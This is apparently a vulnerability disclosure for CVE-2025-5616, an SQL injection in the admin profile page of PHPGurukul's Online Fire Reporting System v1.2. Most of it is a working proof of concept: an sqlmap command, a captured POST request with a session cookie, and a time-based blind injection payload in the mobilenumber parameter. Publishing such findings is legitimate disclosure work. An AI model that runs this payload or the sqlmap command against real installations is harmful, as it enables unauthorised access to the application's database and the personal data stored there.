# CVE-2025-5616

SQLi vulnerability in Online Fire Reporting System v1.2 of file /admin/profile.php

**vender**:

- [PHPGurukul](https://vuldb.com/?vendor.phpgurukul)
- Online Fire Reporting System

**SoftLink**:

- [Online Fire Reporting System Project in PHP- PHPGurukul](https://phpgurukul.com/online-fire-reporting-system-using-php-and-mysql/)

**Vulnerable File**

- /admin/profile.php

**Version**

- V1.2

### POC

```
sqlmap -r request.txt --level 5 --batch
```



```http
POST /admin/profile.php HTTP/1.1
Host: www.firereport.top
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Referer: http://www.firereport.top/admin/profile.php
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
Origin: http://www.firereport.top
Cookie: PHPSESSID=vhqmp6o0p6p8lf7sscpqhrp6tf
Priority: u=0, i
Content-Length: 92

adminname=Admin&username=admin&email=admin%40admin.com&mobilenumber=1888888888&update=Update
```



```
---
Parameter: mobilenumber (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: adminname=Admin&username=admin&email=admin@admin.com&mobilenumber=1888888888' AND (SELECT 6253 FROM (SELECT(SLEEP(5)))zwZb)-- POPP&update=Update
---
```

![image-20250531221803766](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505312218876.png)